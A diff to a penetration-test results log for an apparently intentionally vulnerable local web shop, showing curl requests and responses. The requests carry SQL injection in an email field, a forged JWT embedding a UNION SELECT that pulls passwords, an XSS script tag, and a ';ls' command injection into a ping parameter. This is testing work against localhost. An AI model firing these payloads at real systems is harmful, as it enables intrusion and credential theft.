@@ -66,9 +66,12 @@ source pen_tests.sh > pen_test_results.txt
 ------------------------------------------------
 ------------------------------------------------
 
+------------------------------------------------
+------------------------------------------------
+
 Testing SQL Injection by passing default data validation to access the registration endpoint
 
-curl -X POST http://localhost:5500/client_registeration -d 'fullName=newJohnDoe29761&userName=newjohndoe25015&email=newnoname20920@maildrop.cc" OR "1"="1&password=password&phone=1234567890'
+curl -X POST http://localhost:5500/client_registeration -d 'fullName=newJohnDoe23186&userName=newjohndoe22521&password=password&phone=1234567890&email=newnoname18464@maildrop.cc" OR "1"="1'
 
 {"msg":"Email already Exist"}
 ------------------------------------------------
@@ -99,7 +102,7 @@ Testing Resetting the password of the retrieved account
 
 curl -X POST http://localhost:5500/update_info -d "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InNwYW1tZXIiLCJlbWFpbCI6InNwYW1AZW1haWwuY29tXCIgdW5pb24gc2VsZWN0IHBhc3N3b3JkIHx8IFwiOlwiIHx8IGVtYWlsIGZyb20gdXNlcnM7LS0iLCJyb2xlIjoiYWRtaW5AMTIzNDphZG1pbkB0ZXN0LmNvbSJ9.Ket7bPwysNf0cmO2YJmg_ZuIyRabd6Byu9ROUq9vnCA&currentPassword=admin@1234&newPassword=newpass"
 
-{"msg":"Passowrd Reseted"}
+{"msg":"Password Reset"}
 ------------------------------------------------
 ------------------------------------------------
 
@@ -107,7 +110,7 @@ Testing Input Validation
 
 curl -X POST http://localhost:5500/client_registeration -d 'fullName=<script>alert(XSS)</script>&userName=testuser&email=test@example.com&password=test&phone=1234567890'
 
-{"msg":"Email already Exist"}
+{"msg":"User Registered"}
 ------------------------------------------------
 ------------------------------------------------
 
@@ -115,18 +118,15 @@ Testing Insecure Use of Ping
 
 curl -X GET http://localhost:5500/products -d 'source=google.com;ls'
 
-{"msg":"Error"}
+{"products":[{"id":1,"title":"Essence Mascara Lash Princess","description":"The Essence Mascara Lash Princess is a popular mascara known for its volumizing and lengthening effects. Achieve dramatic lashes with this long-lasting and cruelty-free formula.","category":"beauty","price":9.99,"discountPercentage":7.17,"rating":4.94,"stock":5,"tags":["beauty","mascara"],"brand":"Essence","sku":"RCH45Q1A","weight":2,"dimensions":{"width":23.17,"height":14.43,"depth":28.01},"warrantyInformation":"1 month warranty","shippingInformation":"Ships in 1 month","availabilityStatus":"Low Stock","reviews":[{"rating":2,"comment":"Very unhappy with my purchase!","date":"2024-05-23T08:56:21.618Z","reviewerName":"John Doe","reviewerEmail":"john.doe@x.dummyjson.com"},{"rating":2,"comment":"Not as described!","date":"2024-05-23T08:56:21.618Z","reviewerName":"Nolan Gonzalez","reviewerEmail":"nolan.gonzalez@x.dummyjson.com"},{"rating":5,"comment":"Very satisfied!","date":"2024-05-23T08:56:21.618Z","reviewerName":"Scarlett Wright","reviewerEmail":"scarlett.wright@x.dummyjson.com"}],"returnPolicy":"30 days return policy","minimumOrderQuantity":24,"meta":{"createdAt":"2024-05-23T08:56:21.618Z","updatedAt":"2024-05-23T08:56:21.618Z","barcode":"9164035109868","qrCode":"https:\/\/assets.dummyjson.com\/public\/qr-code.png"},"images":["https:\/\/cdn.dummyjson.com\/products\/images\/beauty\/Essence%20Mascara%20Lash%20Princess\/1.png"],"thumbnail":"https:\/\/cdn.dummyjson.com\/products\/images\/beauty\/Essence%20Mascara%20Lash%20Princess\/thumbnail.png"}],"total":194,"skip":0,"limit":30}
 ------------------------------------------------
 ------------------------------------------------
 Testing Weak Error Message
 
 curl -X POST http://localhost:5500/client_login -d 'email=nonexistent@example.com&password=wrongpassword'
 
-<!doctype html>
-<html lang=en>
-<title>400 Bad Request</title>
-<h1>Bad Request</h1>
-<p>The browser (or proxy) sent a request that this server could not understand.</p>
+{"message":"The browser (or proxy) sent a request that this server could not understand."}
+
 
 -------------------------------------
 ------------------------------------
